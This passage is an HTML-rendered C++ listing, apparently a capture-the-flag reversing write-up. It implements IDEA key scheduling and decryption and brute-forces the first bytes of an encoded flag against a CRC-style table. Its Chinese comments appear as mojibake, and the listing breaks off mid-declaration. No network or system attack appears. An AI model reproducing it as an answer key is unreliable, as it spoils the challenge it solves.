class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bitset&lt;16&gt; code;</span><br><span class="line"><span class="keyword">typedef</span> bitset&lt;128&gt; key;</span><br><span class="line"></span><br><span class="line">bitset&lt;16&gt; sub_key[<span class="number">52</span>];</span><br><span class="line">bitset&lt;16&gt; inv_sub_key[<span class="number">52</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">XOR</span><span class="params">(code code_1, code code_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> code_1 ^ code_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">Plus</span><span class="params">(code code_1, code code_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp += code_1[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i) + code_2[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    tmp %= <span class="number">65536</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">invPlus</span><span class="params">(code code_in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        tmp += code_in[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    tmp = <span class="number">65536</span> - tmp;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">Times</span><span class="params">(code code_1, code code_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tmp_1 = <span class="number">0</span>, tmp_2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp_1 += code_1[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">        tmp_2 += code_2[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tmp_1 == <span class="number">0</span>)</span><br><span class="line">        tmp_1 = <span class="number">65536</span>;</span><br><span class="line">    <span class="keyword">if</span> (tmp_2 == <span class="number">0</span>)</span><br><span class="line">        tmp_2 = <span class="number">65536</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tmp = (tmp_1 * tmp_2) % <span class="number">65537</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(tmp == <span class="number">65536</span> ? <span class="number">0</span> : tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Exgcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b)</span><br><span class="line">        x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">Exgcd</span>(b, a % b, y, x), y -= a / b * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">invTimes</span><span class="params">(code code_in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        tmp += code_in[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">65537</span>;</span><br><span class="line">    <span class="built_in">Exgcd</span>(tmp, p, x, y);</span><br><span class="line">    x = (x % p + p) % p;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">subkeys_get</span><span class="params">(code keys_input[<span class="number">8</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    key keys;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            keys[j + <span class="number">16</span> * i] = keys_input[<span class="number">7</span> - i][j];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            sub_key[i][<span class="number">15</span> - j] = keys[<span class="number">127</span> - (j + <span class="number">16</span> * i)];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key tmp_keys = keys &gt;&gt; <span class="number">103</span>;</span><br><span class="line">        keys = (keys &lt;&lt; <span class="number">25</span>) | tmp_keys;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = (<span class="number">8</span> + <span class="number">8</span> * i); j &lt; (<span class="number">8</span> * (i + <span class="number">2</span>)); j++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">                sub_key[j][<span class="number">15</span> - k] = keys[<span class="number">127</span> - (k + <span class="number">16</span> * (j - <span class="number">8</span> - <span class="number">8</span> * i))];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key tmp_keys = keys &gt;&gt; <span class="number">103</span>;</span><br><span class="line">    keys = (keys &lt;&lt; <span class="number">25</span>) | tmp_keys;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">48</span>; i &lt; <span class="number">52</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            sub_key[i][<span class="number">15</span> - j] = keys[<span class="number">127</span> - (j + <span class="number">16</span> * (i - <span class="number">48</span>))];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inv_subkeys_get</span><span class="params">(code sub_key[<span class="number">52</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">6</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        inv_sub_key[i] = <span class="built_in">invTimes</span>(sub_key[<span class="number">48</span> - i]);</span><br><span class="line">        inv_sub_key[i + <span class="number">1</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">50</span> - i]);</span><br><span class="line">        inv_sub_key[i + <span class="number">2</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">49</span> - i]);</span><br><span class="line">        inv_sub_key[i + <span class="number">3</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">51</span> - i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        inv_sub_key[i + <span class="number">4</span>] = sub_key[<span class="number">46</span> - i];</span><br><span class="line">        inv_sub_key[i + <span class="number">5</span>] = sub_key[<span class="number">47</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    inv_sub_key[<span class="number">0</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">48</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">1</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">49</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">2</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">50</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">3</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">51</span>]);</span><br><span class="line"></span><br><span class="line">    inv_sub_key[<span class="number">48</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">0</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">49</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">1</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">50</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">2</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">51</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">bitset&lt;64&gt; <span class="title">dencrypt</span><span class="params">(bitset&lt;<span class="number">64</span>&gt; cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bitset&lt;16&gt; I_1, I_2, I_3, I_4;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        I_1[<span class="number">15</span> - i] = cipher[<span class="number">63</span> - i];</span><br><span class="line">        I_2[<span class="number">15</span> - i] = cipher[<span class="number">47</span> - i];</span><br><span class="line">        I_3[<span class="number">15</span> - i] = cipher[<span class="number">31</span> - i];</span><br><span class="line">        I_4[i] = cipher[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        bitset&lt;16&gt; tmp_1 = <span class="built_in">Times</span>(inv_sub_key[i], I_1);</span><br><span class="line">        bitset&lt;16&gt; tmp_2 = <span class="built_in">Plus</span>(inv_sub_key[i + <span class="number">1</span>], I_2);</span><br><span class="line">        bitset&lt;16&gt; tmp_3 = <span class="built_in">Plus</span>(inv_sub_key[i + <span class="number">2</span>], I_3);</span><br><span class="line">        bitset&lt;16&gt; tmp_4 = <span class="built_in">Times</span>(inv_sub_key[i + <span class="number">3</span>], I_4);</span><br><span class="line">        bitset&lt;16&gt; tmp_5 = <span class="built_in">XOR</span>(tmp_1, tmp_3);</span><br><span class="line">        bitset&lt;16&gt; tmp_6 = <span class="built_in">XOR</span>(tmp_2, tmp_4);</span><br><span class="line">        bitset&lt;16&gt; tmp_7 = <span class="built_in">Times</span>(inv_sub_key[i + <span class="number">4</span>], tmp_5);</span><br><span class="line">        bitset&lt;16&gt; tmp_8 = <span class="built_in">Plus</span>(tmp_6, tmp_7);</span><br><span class="line">        bitset&lt;16&gt; tmp_9 = <span class="built_in">Times</span>(tmp_8, inv_sub_key[i + <span class="number">5</span>]);</span><br><span class="line">        bitset&lt;16&gt; tmp_10 = <span class="built_in">Plus</span>(tmp_7, tmp_9);</span><br><span class="line">        I_1 = <span class="built_in">XOR</span>(tmp_1, tmp_9);</span><br><span class="line">        I_2 = <span class="built_in">XOR</span>(tmp_3, tmp_9);</span><br><span class="line">        I_3 = <span class="built_in">XOR</span>(tmp_2, tmp_10);</span><br><span class="line">        I_4 = <span class="built_in">XOR</span>(tmp_4, tmp_10);</span><br><span class="line">    &#125;</span><br><span class="line">    bitset&lt;16&gt; Y_1 = <span class="built_in">Times</span>(I_1, inv_sub_key[<span class="number">48</span>]);</span><br><span class="line">    bitset&lt;16&gt; Y_2 = <span class="built_in">Plus</span>(I_3, inv_sub_key[<span class="number">49</span>]);</span><br><span class="line">    bitset&lt;16&gt; Y_3 = <span class="built_in">Plus</span>(I_2, inv_sub_key[<span class="number">50</span>]);</span><br><span class="line">    bitset&lt;16&gt; Y_4 = <span class="built_in">Times</span>(I_4, inv_sub_key[<span class="number">51</span>]);</span><br><span class="line"></span><br><span class="line">    bitset&lt;64&gt; plaint;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        plaint[i] = Y_4[i];</span><br><span class="line">        plaint[i + <span class="number">16</span>] = Y_3[i];</span><br><span class="line">        plaint[i + <span class="number">32</span>] = Y_2[i];</span><br><span class="line">        plaint[i + <span class="number">48</span>] = Y_1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> plaint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> box1[] = &#123;</span><br><span class="line">        <span class="number">0x00000000</span>, <span class="number">0xC0BA6CAC</span>, <span class="number">0x5A05DF1B</span>, <span class="number">0x9ABFB3B7</span>, <span class="number">0xB40BBE36</span>, <span class="number">0x74B1D29A</span>,</span><br><span class="line">        <span class="number">0xEE0E612D</span>, <span class="number">0x2EB40D81</span>, <span class="number">0xB3667A2F</span>, <span class="number">0x73DC1683</span>, <span class="number">0xE963A534</span>, <span class="number">0x29D9C998</span>, <span class="number">0x076DC419</span>, <span class="number">0xC7D7A8B5</span>,</span><br><span class="line">        <span class="number">0x5D681B02</span>, <span class="number">0x9DD277AE</span>, <span class="number">0xBDBDF21D</span>, <span class="number">0x7D079EB1</span>, <span class="number">0xE7B82D06</span>, <span class="number">0x270241AA</span>, <span class="number">0x09B64C2B</span>, <span class="number">0xC90C2087</span>,</span><br><span class="line">        <span class="number">0x53B39330</span>, <span class="number">0x9309FF9C</span>, <span class="number">0x0EDB8832</span>, <span class="number">0xCE61E49E</span>, <span class="number">0x54DE5729</span>, <span class="number">0x94643B85</span>, <span class="number">0xBAD03604</span>, <span class="number">0x7A6A5AA8</span>,</span><br><span class="line">        <span class="number">0xE0D5E91F</span>, <span class="number">0x206F85B3</span>, <span class="number">0xA00AE279</span>, <span class="number">0x60B08ED5</span>, <span class="number">0xFA0F3D62</span>, <span class="number">0x3AB551CE</span>, <span class="number">0x14015C4F</span>, <span class="number">0xD4BB30E3</span>,</span><br><span class="line">        <span class="number">0x4E048354</span>, <span class="number">0x8EBEEFF8</span>, <span class="number">0x136C9856</span>, <span class="number">0xD3D6F4FA</span>, <span class="number">0x4969474D</span>, <span class="number">0x89D32BE1</span>, <span class="number">0xA7672660</span>, <span class="number">0x67DD4ACC</span>,</span><br><span class="line">        <span class="number">0xFD62F97B</span>, <span class="number">0x3DD895D7</span>, <span class="number">0x1DB71064</span>, <span class="number">0xDD0D7CC8</span>, <span class="number">0x47B2CF7F</span>, <span class="number">0x8708A3D3</span>, <span class="number">0xA9BCAE52</span>, <span class="number">0x6906C2FE</span>,</span><br><span class="line">        <span class="number">0xF3B97149</span>, <span class="number">0x33031DE5</span>, <span class="number">0xAED16A4B</span>, <span class="number">0x6E6B06E7</span>, <span class="number">0xF4D4B550</span>, <span class="number">0x346ED9FC</span>, <span class="number">0x1ADAD47D</span>, <span class="number">0xDA60B8D1</span>,</span><br><span class="line">        <span class="number">0x40DF0B66</span>, <span class="number">0x806567CA</span>, <span class="number">0x9B64C2B1</span>, <span class="number">0x5BDEAE1D</span>, <span class="number">0xC1611DAA</span>, <span class="number">0x01DB7106</span>, <span class="number">0x2F6F7C87</span>, <span class="number">0xEFD5102B</span>,</span><br><span class="line">        <span class="number">0x756AA39C</span>, <span class="number">0xB5D0CF30</span>, <span class="number">0x2802B89E</span>, <span class="number">0xE8B8D432</span>, <span class="number">0x72076785</span>, <span class="number">0xB2BD0B29</span>, <span class="number">0x9C0906A8</span>, <span class="number">0x5CB36A04</span>,</span><br><span class="line">        <span class="number">0xC60CD9B3</span>, <span class="number">0x06B6B51F</span>, <span class="number">0x26D930AC</span>, <span class="number">0xE6635C00</span>, <span class="number">0x7CDCEFB7</span>, <span class="number">0xBC66831B</span>, <span class="number">0x92D28E9A</span>, <span class="number">0x5268E236</span>,</span><br><span class="line">        <span class="number">0xC8D75181</span>, <span class="number">0x086D3D2D</span>, <span class="number">0x95BF4A83</span>, <span class="number">0x5505262F</span>, <span class="number">0xCFBA9598</span>, <span class="number">0x0F00F934</span>, <span class="number">0x21B4F4B5</span>, <span class="number">0xE10E9819</span>,</span><br><span class="line">        <span class="number">0x7BB12BAE</span>, <span class="number">0xBB0B4702</span>, <span class="number">0x3B6E20C8</span>, <span class="number">0xFBD44C64</span>, <span class="number">0x616BFFD3</span>, <span class="number">0xA1D1937F</span>, <span class="number">0x8F659EFE</span>, <span class="number">0x4FDFF252</span>,</span><br><span class="line">        <span class="number">0xD56041E5</span>, <span class="number">0x15DA2D49</span>, <span class="number">0x88085AE7</span>, <span class="number">0x48B2364B</span>, <span class="number">0xD20D85FC</span>, <span class="number">0x12B7E950</span>, <span class="number">0x3C03E4D1</span>, <span class="number">0xFCB9887D</span>,</span><br><span class="line">        <span class="number">0x66063BCA</span>, <span class="number">0xA6BC5766</span>, <span class="number">0x86D3D2D5</span>, <span class="number">0x4669BE79</span>, <span class="number">0xDCD60DCE</span>, <span class="number">0x1C6C6162</span>, <span class="number">0x32D86CE3</span>, <span class="number">0xF262004F</span>,</span><br><span class="line">        <span class="number">0x68DDB3F8</span>, <span class="number">0xA867DF54</span>, <span class="number">0x35B5A8FA</span>, <span class="number">0xF50FC456</span>, <span class="number">0x6FB077E1</span>, <span class="number">0xAF0A1B4D</span>, <span class="number">0x81BE16CC</span>, <span class="number">0x41047A60</span>,</span><br><span class="line">        <span class="number">0xDBBBC9D7</span>, <span class="number">0x1B01A57B</span>, <span class="number">0xEDB88321</span>, <span class="number">0x2D02EF8D</span>, <span class="number">0xB7BD5C3A</span>, <span class="number">0x77073096</span>, <span class="number">0x59B33D17</span>, <span class="number">0x990951BB</span>,</span><br><span class="line">        <span class="number">0x03B6E20C</span>, <span class="number">0xC30C8EA0</span>, <span class="number">0x5EDEF90E</span>, <span class="number">0x9E6495A2</span>, <span class="number">0x04DB2615</span>, <span class="number">0xC4614AB9</span>, <span class="number">0xEAD54738</span>, <span class="number">0x2A6F2B94</span>,</span><br><span class="line">        <span class="number">0xB0D09823</span>, <span class="number">0x706AF48F</span>, <span class="number">0x5005713C</span>, <span class="number">0x90BF1D90</span>, <span class="number">0x0A00AE27</span>, <span class="number">0xCABAC28B</span>, <span class="number">0xE40ECF0A</span>, <span class="number">0x24B4A3A6</span>,</span><br><span class="line">        <span class="number">0xBE0B1011</span>, <span class="number">0x7EB17CBD</span>, <span class="number">0xE3630B13</span>, <span class="number">0x23D967BF</span>, <span class="number">0xB966D408</span>, <span class="number">0x79DCB8A4</span>, <span class="number">0x5768B525</span>, <span class="number">0x97D2D989</span>,</span><br><span class="line">        <span class="number">0x0D6D6A3E</span>, <span class="number">0xCDD70692</span>, <span class="number">0x4DB26158</span>, <span class="number">0x8D080DF4</span>, <span class="number">0x17B7BE43</span>, <span class="number">0xD70DD2EF</span>, <span class="number">0xF9B9DF6E</span>, <span class="number">0x3903B3C2</span>,</span><br><span class="line">        <span class="number">0xA3BC0075</span>, <span class="number">0x63066CD9</span>, <span class="number">0xFED41B77</span>, <span class="number">0x3E6E77DB</span>, <span class="number">0xA4D1C46C</span>, <span class="number">0x646BA8C0</span>, <span class="number">0x4ADFA541</span>, <span class="number">0x8A65C9ED</span>,</span><br><span class="line">        <span class="number">0x10DA7A5A</span>, <span class="number">0xD06016F6</span>, <span class="number">0xF00F9345</span>, <span class="number">0x30B5FFE9</span>, <span class="number">0xAA0A4C5E</span>, <span class="number">0x6AB020F2</span>, <span class="number">0x44042D73</span>, <span class="number">0x84BE41DF</span>,</span><br><span class="line">        <span class="number">0x1E01F268</span>, <span class="number">0xDEBB9EC4</span>, <span class="number">0x4369E96A</span>, <span class="number">0x83D385C6</span>, <span class="number">0x196C3671</span>, <span class="number">0xD9D65ADD</span>, <span class="number">0xF762575C</span>, <span class="number">0x37D83BF0</span>,</span><br><span class="line">        <span class="number">0xAD678847</span>, <span class="number">0x6DDDE4EB</span>, <span class="number">0x76DC4190</span>, <span class="number">0xB6662D3C</span>, <span class="number">0x2CD99E8B</span>, <span class="number">0xEC63F227</span>, <span class="number">0xC2D7FFA6</span>, <span class="number">0x026D930A</span>,</span><br><span class="line">        <span class="number">0x98D220BD</span>, <span class="number">0x58684C11</span>, <span class="number">0xC5BA3BBF</span>, <span class="number">0x05005713</span>, <span class="number">0x9FBFE4A4</span>, <span class="number">0x5F058808</span>, <span class="number">0x71B18589</span>, <span class="number">0xB10BE925</span>,</span><br><span class="line">        <span class="number">0x2BB45A92</span>, <span class="number">0xEB0E363E</span>, <span class="number">0xCB61B38D</span>, <span class="number">0x0BDBDF21</span>, <span class="number">0x91646C96</span>, <span class="number">0x51DE003A</span>, <span class="number">0x7F6A0DBB</span>, <span class="number">0xBFD06117</span>,</span><br><span class="line">        <span class="number">0x256FD2A0</span>, <span class="number">0xE5D5BE0C</span>, <span class="number">0x7807C9A2</span>, <span class="number">0xB8BDA50E</span>, <span class="number">0x220216B9</span>, <span class="number">0xE2B87A15</span>, <span class="number">0xCC0C7794</span>, <span class="number">0x0CB61B38</span>,</span><br><span class="line">        <span class="number">0x9609A88F</span>, <span class="number">0x56B3C423</span>, <span class="number">0xD6D6A3E9</span>, <span class="number">0x166CCF45</span>, <span class="number">0x8CD37CF2</span>, <span class="number">0x4C69105E</span>, <span class="number">0x62DD1DDF</span>, <span class="number">0xA2677173</span>,</span><br><span class="line">        <span class="number">0x38D8C2C4</span>, <span class="number">0xF862AE68</span>, <span class="number">0x65B0D9C6</span>, <span class="number">0xA50AB56A</span>, <span class="number">0x3FB506DD</span>, <span class="number">0xFF0F6A71</span>, <span class="number">0xD1BB67F0</span>, <span class="number">0x11010B5C</span>,</span><br><span class="line">        <span class="number">0x8BBEB8EB</span>, <span class="number">0x4B04D447</span>, <span class="number">0x6B6B51F4</span>, <span class="number">0xABD13D58</span>, <span class="number">0x316E8EEF</span>, <span class="number">0xF1D4E243</span>, <span class="number">0xDF60EFC2</span>, <span class="number">0x1FDA836E</span>,</span><br><span class="line">        <span class="number">0x856530D9</span>, <span class="number">0x45DF5C75</span>, <span class="number">0xD80D2BDB</span>, <span class="number">0x18B74777</span>, <span class="number">0x8208F4C0</span>, <span class="number">0x42B2986C</span>, <span class="number">0x6C0695ED</span>, <span class="number">0xACBCF941</span>,</span><br><span class="line">        <span class="number">0x36034AF6</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>, <span class="number">0xCCCCCC00</span>, <span class="number">0x00000100</span>, <span class="number">0x00000000</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>,</span><br><span class="line">        <span class="number">0x00000008</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> enc1[]&#123;</span><br><span class="line">        <span class="number">0x46A95BAD</span>,</span><br><span class="line">        <span class="number">0x1CAC84B6</span>,</span><br><span class="line">        <span class="number">0xA67CB2B2</span>,</span><br><span class="line">        <span class="number">0x32188937</span>,</span><br><span class="line">        <span class="number">0x4872D39F</span>,</span><br><span class="line">        <span class="number">0xF2A2E59B</span>,</span><br><span class="line">        <span class="number">0x011B94D2</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// çˆ†ç ´å‰7å­—èŠ‚</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">28</span>; c &lt; <span class="number">132</span>; c++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((~box1[(<span class="type">uint8_t</span>)c ^ <span class="number">0x79</span>] ^ <span class="number">0xB0E0E879</span>) == enc1[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å16å­—èŠ‚è¿›è¡ŒIDEAè§£å¯†</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc2[<span class="number">16</span>] = 